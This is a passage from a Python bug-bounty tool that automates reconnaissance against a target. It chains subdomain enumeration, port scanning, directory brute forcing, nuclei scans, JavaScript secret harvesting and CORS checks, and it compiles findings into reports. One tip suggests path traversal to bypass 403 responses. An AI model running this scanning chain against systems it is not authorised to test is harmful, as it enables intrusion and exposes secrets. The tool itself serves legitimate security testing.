                          r.text[:80].replace(chr(10), " "))
                    findings.append({"type": "sensitive_file", "path": path,
                                     "size": len(r.content)})
                elif r.status_code == 403:
                    gap()
                    warn("Forbidden but exists: " + path)
                    tip("File is protected with a 403 -- try path traversal to bypass")
            except Exception:
                pass
        gap()
        ok("Sensitive file check complete")

    gap()
    if findings:
        save_findings(target, "misconfig", findings)
        found(str(len(findings)) + " misconfigurations found and saved!")
    else:
        ok("No misconfigurations found on this scan.")
        tip("Run a full recon first to discover more of the attack surface.")
    pause()


# ============================================================
#  MODULE 14 - EVIDENCE COLLECTOR
# ============================================================

def module_evidence_collector():
    section_header("MODULE 14 - EVIDENCE COLLECTOR",
                   "Captures HTTP responses and compiles your findings into a summary")
    gap()
    target = get_target()
    if not target:
        return
    url     = normalise_url(target)
    out_dir = os.path.join(ARSENAL_DIR, "reports", target, "evidence")
    os.makedirs(out_dir, exist_ok=True)

    print(Fore.CYAN + "  +" + "-" * W + "+")
    print(box_row("  1.  Capture Response Headers"))
    print(box_row("      Saves server headers for your report"))
    print(box_row(""))
    print(box_row("  2.  Capture Full Page Response"))
    print(box_row("      Saves the complete HTML response"))
    print(box_row(""))
    print(box_row("  3.  Compile All Findings Summary"))
    print(box_row("      Combines all module results into one overview"))
    print(box_row(""))
    print(box_row("  0.  Back to menu"))
    print(Fore.CYAN + "  +" + "-" * W + "+")
    gap()
    choice = input(Fore.WHITE + "  Choose : ").strip()
    if choice == "0":
        return

    if choice == "1":
        section("CAPTURE RESPONSE HEADERS")
        eps = input("  Endpoints to capture, comma separated [default /] : ").strip() or "/"
        for ep in [e.strip() for e in eps.split(",")]:
            info("Capturing headers for " + ep + "...")
            try:
                r = requests.get(url + ep, timeout=10,
                                 headers={"User-Agent": "Mozilla/5.0"})
                fname = "headers" + ep.replace("/", "_") + ".txt"
                p     = os.path.join(out_dir, fname)
                with open(p, "w") as f:
                    f.write("URL: " + url + ep + "\n")
                    f.write("Status: " + str(r.status_code) + "\n")
                    f.write("Captured: " + str(datetime.datetime.now()) + "\n\n")
                    f.write("=== RESPONSE HEADERS ===\n")
                    for k, v in r.headers.items():
                        f.write(k + ": " + v + "\n")
                ok("Saved to " + p)
            except Exception as e:
                err("Could not capture " + ep + ": " + str(e))

    elif choice == "2":
        section("CAPTURE FULL RESPONSE")
        ep = input("  Endpoint to capture [default /] : ").strip() or "/"
        info("Capturing full response for " + ep + "...")
        try:
            r = requests.get(url + ep, timeout=10,
                             headers={"User-Agent": "Mozilla/5.0"})
            fname = "response" + ep.replace("/", "_") + ".html"
            p     = os.path.join(out_dir, fname)
            open(p, "w").write(r.text)
            ok("Response saved to " + p)
            info("File size: " + str(len(r.content)) + " bytes")
        except Exception as e:
            err("Could not capture response: " + str(e))

    elif choice == "3":
        section("COMPILE FINDINGS SUMMARY")
        info("Reading all findings files from previous scans...")
        gap()

        findings_dir = os.path.join(ARSENAL_DIR, "reports", target)
        summary      = []
        total        = 0

        for fname in sorted(os.listdir(findings_dir)):
            if fname.endswith("_findings.json"):
                try:
                    data = json.load(open(os.path.join(findings_dir, fname)))
                    mname = fname.replace("_findings.json", "").upper()
                    summary.append({"module": mname,
                                    "count": len(data), "findings": data})
                    total += len(data)
                except Exception:
                    pass

        if summary:
            ts = datetime.datetime.now().strftime("%Y%m%d_%H%M")
            sf = os.path.join(findings_dir, "SUMMARY_" + ts + ".json")
            json.dump(summary, open(sf, "w"), indent=2)
            gap()
            print(Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+")
            print(box_row("  FINDINGS OVERVIEW", Fore.CYAN + Style.BRIGHT))
            print(Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+")
            for s in summary:
                icon = "[!!]" if s["count"] > 0 else "[ OK]"
                col  = Fore.RED if s["count"] > 0 else Fore.GREEN
                row  = "  " + icon + "  " + s["module"] + " -- " + str(s["count"]) + " findings"
                print(Fore.CYAN + "  |" + col + row[:W] +
                      " " * max(0, W - len(row)) + Fore.CYAN + "|")
            print(Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+")
            print(Fore.YELLOW + Style.BRIGHT +
                  "  |  TOTAL: " + str(total) + " findings across " +
                  str(len(summary)) + " modules" +
                  " " * max(0, W - 10 - len(str(total)) - len(str(len(summary)))) +
                  Fore.CYAN + "|")
            print(Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+")
            gap()
            ok("Summary saved to " + sf)
        else:
            warn("No findings files found yet.")
            tip("Run the scanner modules first, then come back to compile.")
    pause()


# ============================================================
#  RECON HELPERS
# ============================================================

def run_user_tool(tool_name, display_name):
    tool_path = os.path.join(PROJECTS, tool_name, tool_name + ".py")
    info("Launching " + display_name + "...")
    gap()
    if os.path.exists(tool_path):
        subprocess.run("python3 " + tool_path, shell=True,
                       cwd=os.path.join(PROJECTS, tool_name))
    else:
        err("Tool not found: " + tool_path)
        tip("Make sure " + tool_name + " exists in ~/projects/" + tool_name + "/")


def full_automated_chain():
    global last_target
    section_header("FULL AUTOMATED CHAIN",
                   "Complete recon, vuln scan, JS secrets and CORS -- start here!")

    print(Fore.WHITE + """
  This runs through all recon steps automatically:

    Step 1  --  Subdomain enumeration
    Step 2  --  Live host detection
    Step 3  --  Port scanning
    Step 4  --  Directory brute force
    Step 5  --  Endpoint crawling
    Step 6  --  Nuclei vulnerability scan
    Step 7  --  JS secret scanning
    Step 8  --  CORS misconfiguration check
    Step 9  --  Professional report generation
""")
    tip("Each step shows a live timer so you know it is working.")
    tip("Press CTRL+C at any step to skip it and move to the next.")
    gap()
    target = get_target()
    if not target:
        return

    out_dir  = os.path.join(ARSENAL_DIR, "reports", target)
    os.makedirs(out_dir, exist_ok=True)
    wordlist = os.path.join(ARSENAL_DIR, "wordlists", "directories.txt")
    url      = normalise_url(target)

    print(Fore.CYAN + Style.BRIGHT +
          "\n  Chain started for: " + Fore.WHITE + target + "\n")

    steps = [
        (
            "subfinder -d " + target + " -o " + out_dir + "/subdomains.txt",
            "Subdomain Enumeration",
            "Finding all subdomains -- typically 30-90 seconds"
        ),
        (
            "cat " + out_dir + "/subdomains.txt | httpx -silent"
            " -o " + out_dir + "/alive.txt -title -web-server -tech-detect",
            "Live Host Detection",
            "Checking which subdomains are online"
        ),
        (
            "naabu -list " + out_dir + "/alive.txt -o " + out_dir + "/ports.txt",
            "Port Scanning",
            "Scanning open ports -- may show permission warning on unrooted Android"
        ),
        (
            "gobuster dir -u " + url + " -w " + wordlist +
            " -o " + out_dir + "/directories.txt -q",
            "Directory Brute Force",
            "Finding hidden directories -- takes 2-5 minutes"
        ),
        (
            "katana -u " + url + " -o " + out_dir + "/endpoints.txt -silent",
            "Endpoint Crawling",
            "Mapping all URLs and endpoints on the site"
        ),
        (
            "nuclei -l " + out_dir + "/alive.txt -severity high,critical,medium"
            " -o " + out_dir + "/nuclei_results.txt",
            "Nuclei Vulnerability Scan",
            "WARNING: This step takes 5-25 minutes -- completely normal, please wait!"
        ),
    ]

    for cmd, name, tip_text in steps:
        tool = cmd.split()[0]
        if not check_tool(tool):
            warn(tool + " is not installed -- skipping: " + name)
            tip("Install: go install or pkg install " + tool)
            gap()
            continue
        try:
            run_tool_with_status(cmd, name, tip_text)
        except KeyboardInterrupt:
            gap()
            warn("Skipped: " + name)
            gap()

    section("STEP 7 - JS SECRET SCAN")
    info("Scanning all JavaScript files for exposed secrets...")
    gap()

    js_findings = []
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        info("Fetching " + url + "...")
        r       = requests.get(url, timeout=10, headers=headers)
        js_urls = extract_js_urls(url, r.text)
        ok("Found " + str(len(js_urls)) + " JS files")
        gap()

        for i, js_url in enumerate(js_urls, 1):
            print_bar(i, len(js_urls),
                      "File " + str(i) + " of " + str(len(js_urls)))
            try:
                jr   = requests.get(js_url, timeout=8, headers=headers)
                hits = scan_js_content(jr.text, js_url)
                if hits:
                    gap()
                    for h in hits:
                        found(h["type"] + ": " + h["match"][:55])
                    js_findings.extend(hits)
            except Exception:
                pass
        gap()

    except Exception as e:
        warn("JS scan could not complete: " + str(e))

    if js_findings:
        save_findings(target, "js_secrets", js_findings)

    section("STEP 8 - CORS CHECK")
    info("Checking CORS policy for misconfiguration...")
    gap()

    cors_findings = []
    for origin in CORS_ORIGINS:
        try:
            r    = requests.get(
                url, timeout=5,
                allow_redirects=False,
                headers={"Origin": origin, "User-Agent": "Mozilla/5.0"}
            )
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao in (origin, "*"):
                sev = "CRITICAL" if acac.lower() == "true" else "MODERATE"
                found(sev + " CORS: " + origin + " is reflected!")
                cors_findings.append({"type": "cors_" + sev.lower(),
                                      "origin": origin})
            else:
                ok(origin + " -- not reflected")
        except requests.exceptions.Timeout:
            warn("Timeout on " + origin + " -- skipping")
        except Exception:
            pass

    if cors_findings:
        save_findings(target, "misconfig", cors_findings)

    section("STEP 9 - GENERATING REPORT")
    generate_report(target, out_dir)

    gap()
    print(Fore.GREEN + Style.BRIGHT + "  +" + "=" * W + "+")
    print(Fore.GREEN + Style.BRIGHT + "  |" +
          "  CHAIN COMPLETE! All results saved.".center(W) + "|")
    print(Fore.GREEN + Style.BRIGHT + "  +" + "=" * W + "+")
    gap()
    info("All results saved to: reports/" + target + "/")
    tip("Run option 14 to compile a full findings summary.")
    tip("Run option 15 to generate your markdown bug bounty report.")
    gap()
    pause()


def generate_report(target=None, out_dir=None):
    global last_target
    if not target:
        section_header("GENERATE PROFESSIONAL REPORT",
                       "Compiles all findings into a structured markdown report")
        target = get_target(
            "  Target [" + last_target + "] : "
        ) or last_target

    if not out_dir:
        out_dir = os.path.join(ARSENAL_DIR, "reports", target)
    os.makedirs(out_dir, exist_ok=True)

    info("Building your report...")
    gap()

    def rf(name):
        p = os.path.join(out_dir, name)
        if os.path.exists(p):
            lines = open(p).readlines()
            return lines, len(lines)
        return [], 0

    def rj(name):
        p = os.path.join(out_dir, name)
        return json.load(open(p)) if os.path.exists(p) else []

    subdomains, sc = rf("subdomains.txt")
    alive,      ac = rf("alive.txt")
    nuclei,     nc = rf("nuclei_results.txt")
    endpoints,  ec = rf("endpoints.txt")
    js_s  = rj("js_secrets_findings.json")
    api_f = rj("api_findings.json")
    mis_f = rj("misconfig_findings.json")
    aut_f = rj("auth_findings.json")
    vul_f = rj("vuln_findings.json")

    def sev(c, h=1, m=1):
        if c >= h: return "HIGH"
        if c >= m: return "MEDIUM"
        return "CLEAN"

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M")
    fp = os.path.join(out_dir, "report_" + target + "_" + ts + ".md")

    with open(fp, "w") as f:
        f.write("# Bug Bounty Report -- " + target + "\n\n")
        f.write("| | |\n|---|---|\n")
        f.write("| **Target** | " + target + " |\n")
        f.write("| **Date** | " +
                datetime.datetime.now().strftime("%d %B %Y %H:%M") + " |\n")
        f.write("| **Tool** | Termux Bug Bounty Arsenal v5.1 by Mrbead93 |\n\n")
        f.write("---\n\n")
        f.write("## Executive Summary\n\n")
        f.write("| Category | Count | Severity |\n|---|---|---|\n")
        f.write("| Subdomains       | " + str(sc) + " | -- |\n")
        f.write("| Live Hosts       | " + str(ac) + " | -- |\n")
        f.write("| Endpoints        | " + str(ec) + " | -- |\n")
        f.write("| Nuclei Findings  | " + str(nc) + " | " + sev(nc) + " |\n")
        f.write("| JS Secrets       | " + str(len(js_s)) + " | " + sev(len(js_s)) + " |\n")
        f.write("| API Endpoints    | " + str(len(api_f)) + " | " + sev(len(api_f), 5, 2) + " |\n")
        f.write("| Misconfigs       | " + str(len(mis_f)) + " | " + sev(len(mis_f)) + " |\n")
        f.write("| Auth Issues      | " + str(len(aut_f)) + " | " + sev(len(aut_f)) + " |\n")
        f.write("| Vulnerabilities  | " + str(len(vul_f)) + " | " + sev(len(vul_f)) + " |\n\n")

        if js_s:
            f.write("## JavaScript Secrets Found\n\n")
            f.write("> These secrets were found exposed in client-side JavaScript\n\n")
            for s in js_s:
                f.write("### " + s["type"] + "\n")
                f.write("- **Value:** `" + s["match"][:100] + "`\n")
                f.write("- **Source:** `" + s["source"] + "`\n\n")

        if mis_f:
            f.write("## Misconfigurations\n\n")
            for m in mis_f:
                f.write("- **" + m.get("type", "unknown") + "**")
                if "path" in m:   f.write(": `" + m["path"] + "`")
                if "origin" in m: f.write(": Origin `" + m["origin"] + "`")
                f.write("\n")
            f.write("\n")

        if aut_f:
            f.write("## Authentication Issues\n\n")
            for a in aut_f:
                f.write("- **" + a.get("type", "unknown") + "**")
                if "header" in a: f.write(": `" + str(a["header"]) + "`")
                if "name" in a:   f.write(": Cookie `" + a["name"] + "`")
                f.write("\n")
            f.write("\n")

        if api_f:
            f.write("## API Endpoints Discovered\n\n")
            for a in api_f[:20]:
                icon = "[OPEN]" if a.get("status") in (200, 201) else "[AUTH]"
                f.write("- " + icon + " `" + a.get("endpoint", "") + "` -- HTTP " +
                        str(a.get("status", "")) +
                        (" [JSON]" if a.get("json") else "") + "\n")
            f.write("\n")

        if nuclei:
            f.write("## Nuclei Vulnerability Findings\n\n```\n")
            f.writelines(nuclei[:30])
            f.write("```\n\n")

        if subdomains:
            f.write("## Subdomains Discovered\n\n```\n")
            f.writelines(subdomains[:50])
            f.write("```\n\n")

        f.write("---\n")
        f.write("*Generated by Termux Bug Bounty Arsenal v5.1"
                " -- authorised testing only*\n")

    ok("Report saved to " + fp)
    gap()
    tip("Open this .md file in a markdown viewer for a formatted report.")
    tip("You can attach this directly to your bug bounty submission.")


# ============================================================
#  MAIN MENU
# ============================================================

def main_menu():
    while True:
        banner()
        print(Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+")
        print(box_row("  RECON", Fore.CYAN + Style.BRIGHT))
        print(Fore.CYAN + "  |" + "-" * W + "|")
        print(box_row("   1.  Run ReconX                     (Manual mode)"))
        print(box_row("   2.  Run CredX                      (Manual mode)"))
        print(box_row("   3.  Subdomain Discovery + Live Hosts"))
        print(box_row("   4.  Port Scanning"))
        print(box_row("   5.  Directory and File Brute Force"))
        print(box_row("   6.  Nuclei Vulnerability Scan"))
        print(box_row("   7.  Full Automated Chain           [START HERE]"))
        print(Fore.CYAN + "  |" + "-" * W + "|")
        print(box_row("  VULNERABILITY TESTING", Fore.CYAN + Style.BRIGHT))
        print(Fore.CYAN + "  |" + "-" * W + "|")
        print(box_row("   9.  Vulnerability Scanner  (XSS/SQLi/SSRF/LFI)"))
        print(box_row("  10.  API Hunter"))
        print(box_row("  11.  JS Secret Scanner"))
        print(box_row("  12.  Auth Tester"))
        print(box_row("  13.  Misconfiguration Hunter"))
        print(Fore.CYAN + "  |" + "-" * W + "|")
        print(box_row("  REPORTING", Fore.CYAN + Style.BRIGHT))
        print(Fore.CYAN + "  |" + "-" * W + "|")
        print(box_row("  14.  Evidence Collector"))
        print(box_row("  15.  Generate Professional Report"))
        print(Fore.CYAN + "  |" + "-" * W + "|")
        print(box_row("   0.  Exit"))
        print(Fore.CYAN + Style.BRIGHT + "  +" + "-" * W + "+")
        gap()

        choice = input(Fore.WHITE + "  Choose an option : ").strip()

        if   choice == "1":  run_user_tool("reconx", "ReconX")
        elif choice == "2":  run_user_tool("credx", "CredX")
        elif choice == "3":
            target = get_target()
            if target:
                out = os.path.join(ARSENAL_DIR, "reports", target)
                os.makedirs(out, exist_ok=True)
                run_tool_with_status(
                    "subfinder -d " + target + " -o " + out + "/subdomains.txt",
                    "Subdomain Enumeration",
                    "Finding all subdomains -- typically 30-90 seconds"
                )
                run_tool_with_status(
                    "cat " + out + "/subdomains.txt | httpx -silent"
                    " -o " + out + "/alive.txt -title -web-server -tech-detect",
                    "Live Host Detection",
                    "Checking which subdomains are currently online"
                )
                ok("Recon complete -- results saved to reports/" + target + "/")
                pause()
        elif choice == "4":
            target = get_target()
            if target:
                out = os.path.join(ARSENAL_DIR, "reports", target)
                run_tool_with_status(
                    "naabu -list " + out + "/alive.txt -o " + out + "/ports.txt",
                    "Port Scanning",
                    "Scanning for open ports -- may need root for full results"
                )
                pause()
        elif choice == "5":
            target = get_target()
            if target:
                out = os.path.join(ARSENAL_DIR, "reports", target)
                wl  = os.path.join(ARSENAL_DIR, "wordlists", "directories.txt")
                run_tool_with_status(
                    "gobuster dir -u " + normalise_url(target) +
                    " -w " + wl + " -o " + out + "/directories.txt -q",
                    "Directory Brute Force",
                    "Finding hidden directories -- takes 2-5 minutes"
                )
                pause()
        elif choice == "6":
            target = get_target()
            if target:
                out = os.path.join(ARSENAL_DIR, "reports", target)
                run_tool_with_status(
                    "nuclei -l " + out + "/alive.txt -severity high,critical,medium"
                    " -o " + out + "/nuclei_results.txt",
                    "Nuclei Vulnerability Scan",
                    "WARNING: This takes 5-25 minutes -- completely normal, please wait!"
                )
                pause()
        elif choice == "7":  full_automated_chain()
        elif choice == "9":  module_vuln_scanner()
        elif choice == "10": module_api_hunter()
        elif choice == "11": module_js_scanner()
        elif choice == "12": module_auth_tester()
        elif choice == "13": module_misconfig_hunter()
        elif choice == "14": module_evidence_collector()
        elif choice == "15": generate_report()
        elif choice == "0":
            clr()
            print(Fore.RED + Style.BRIGHT + "\n  +" + "=" * W + "+")
            print(Fore.RED + Style.BRIGHT + "  |" +
                  "  Thanks for using TBA -- Happy Hunting!".center(W) + "|")
            print(Fore.RED + Style.BRIGHT + "  +" + "=" * W + "+\n")
            sys.exit(0)
        else:
            err("Invalid choice -- please pick a number from the menu")
            time.sleep(1)


if __name__ == "__main__":
    main_menu()
